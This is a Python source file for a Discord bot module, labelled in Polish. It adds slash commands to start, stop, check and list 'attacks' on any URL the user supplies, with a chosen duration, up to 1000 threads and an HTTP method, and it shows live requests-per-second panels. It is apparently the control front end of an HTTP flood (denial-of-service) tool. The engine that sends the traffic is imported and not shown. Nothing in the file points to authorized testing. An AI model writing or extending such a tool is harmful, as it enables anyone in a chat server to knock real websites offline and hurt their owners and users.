"""Komendy: start, stop, status, lista."""
from __future__ import annotations

import discord
from discord import app_commands
from discord.ext import commands, tasks

from core.engine import AttackEngine, AttackError, parse_target
from core.models import AttackState
from utils.format import human
from utils.views import AttackPanel


class AttackCog(commands.Cog, name="Ataki"):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        self.engine: AttackEngine = bot.engine  # type: ignore[attr-defined]
        self.monitor.start()

    def cog_unload(self) -> None:
        self.monitor.cancel()

    @tasks.loop(seconds=3)
    async def monitor(self) -> None:
        for attack in list(self.engine.active.values()):
            hist = self.bot.history.setdefault(attack.id, [])  # type: ignore[attr-defined]
            hist.append(attack.stats.rps)
            if len(hist) > 30:
                hist.pop(0)
            view = self.bot.panels.get(attack.id)  # type: ignore[attr-defined]
            if not view or not view.message:
                continue
            try:
                await view.message.edit(view=AttackPanel(attack, hist))
            except discord.HTTPException:
                pass

    @monitor.before_loop
    async def before(self) -> None:
        await self.bot.wait_until_ready()

    @app_commands.command(name="start", description="Rozpoczyna atak na adres URL")
    @app_commands.describe(url="Adres strony", czas="Czas w sekundach", watki="Laczna liczba watkow", metoda="Metoda HTTP")
    @app_commands.choices(metoda=[
        app_commands.Choice(name="GET", value="GET"),
        app_commands.Choice(name="HEAD", value="HEAD"),
        app_commands.Choice(name="POST", value="POST"),
    ])
    async def start(
        self, interaction: discord.Interaction, url: str,
        czas: app_commands.Range[int, 5, 300] = 60,
        watki: app_commands.Range[int, 1, 1000] = 100,
        metoda: app_commands.Choice[str] | None = None,
    ) -> None:
        await interaction.response.defer(thinking=True)
        try:
            target = parse_target(url)
        except AttackError as exc:
            await interaction.followup.send(f"\u274c {exc}", ephemeral=True)
            return
        if metoda:
            target.method = metoda.value
        try:
            attack = await self.engine.launch(target, interaction.user.id, czas, watki)
        except AttackError as exc:
            await interaction.followup.send(f"\u274c {exc}", ephemeral=True)
            return
        self.bot.history[attack.id] = []  # type: ignore[attr-defined]
        panel = AttackPanel(attack, [])
        msg = await interaction.followup.send(view=panel)
        panel.message = msg
        self.bot.panels[attack.id] = panel  # type: ignore[attr-defined]

    @app_commands.command(name="stop", description="Zatrzymuje atak")
    async def stop(self, interaction: discord.Interaction, id: str) -> None:
        ok = await self.engine.stop(id)
        await interaction.response.send_message(
            f"\u23f9 Zatrzymano `{id}`" if ok else "\u274c Nie ma takiego ataku",
            ephemeral=not ok,
        )

    @app_commands.command(name="status", description="Stan ataku")
    async def status(self, interaction: discord.Interaction, id: str) -> None:
        attack = self.engine.get(id)
        if not attack:
            await interaction.response.send_message("\u274c Nie ma takiego ataku", ephemeral=True)
            return
        await interaction.response.send_message(view=AttackPanel(attack, self.bot.history.get(id, [])))  # type: ignore[attr-defined]

    @app_commands.command(name="lista", description="Aktywne ataki")
    async def lista(self, interaction: discord.Interaction) -> None:
        active = self.engine.active
        if not active:
            await interaction.response.send_message("Brak aktywnych atakow", ephemeral=True)
            return
        lines = [f"`{a.id}` \u00b7 {a.target.url} \u00b7 {human(a.stats.rps)} rps \u00b7 {a.state.value}" for a in active.values()]
        e = discord.Embed(title=f"Aktywne ({len(active)})", description="\n".join(lines), color=discord.Color.blurple())
        await interaction.response.send_message(embed=e)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(AttackCog(bot))
